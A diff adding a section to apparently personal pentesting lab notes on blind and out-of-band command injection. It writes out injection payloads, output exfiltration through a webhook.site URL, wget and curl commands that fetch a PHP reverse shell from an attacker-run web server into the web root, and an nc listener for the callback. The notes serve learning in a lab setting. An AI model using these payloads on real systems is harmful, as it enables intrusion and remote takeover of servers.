@@ -2288,3 +2288,62 @@ let's try a PHP shell:
 >- use a different port (not 4444) -->  bc something fails
 >	- try common port -->  80/8080/443
 >
+
+#### Blind / Out-of-Band 0x02
+same things, but here we don't see the commands executed
+=>
+it's blind
+Example:
+if we search a website
+![[Pasted image 20240308142418.png]]
+if we search a website that doesn't exist =>  we get NotFound
+=>
+let's try with:
+`https://google.com; whoami;`
+it doesn't give us the command -->  but return Website OK anyway
+
+##### WebHook
+- open Webhook in the browser  ([[cheet#Webhook.site]])
+- copy the unique URL
+- insert the URL + ?\`command\`
+```
+https://webhook.site/a67abe7f-f8f9-44af-bf90-6f29be6fd833?`whoami`
+```
+- open webhook and see if you can see the output of the command
+  <span style="color:#00b050">YES we have it</span>
+	![[Pasted image 20240308143557.png]]
+
+
+##### Trigger new line
+here the OS is linux =>  let's try to trigger new line
+`python3 -m http.server 8080` -->  setup a web server from the attacker
+`https://google.com \n wget 172.17.0.1:8080/test`  -->  try to trigger a new line and retrieve 
+                                                   something from the webserver
+<span style="color:#00b050">It works</span> (404 not found bc we don't have any "test")
+![[Pasted image 20240308144152.png]]
+=>
+we can:
+- create a reverse php shell
+- put it inside our python3 http server
+- try to retrieve from the victim through the vulnerable input
+
+##### Get a shell
+- search on google -->  [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+- copy it locally and change the IP and the port
+- `chmod +x rev.php`
+- open a web server from this directory -->  `python3 -m http.server 8080`
+- try to retrieve the shell as before:
+  `https://google.com \n wget 172.17.0.1:8080/rev.php`
+
+- otherwise try:
+  `https://google.com && curl 172.17.0.1:8080/rev.php > /var/www/html/rev.php`
+	![[Pasted image 20240308150121.png]]
+  now:
+	- open new tab and setup a listener -->  `nc -nvlp 444`
+	- open new browser page and search -->  localhost/rev.php
+	  ![[Pasted image 20240308150350.png]]
+	  
+	  <span style="color:#00b050">We have our shell!</span>
+
+#### Command injection 0x03
+goal -->  popup a shell
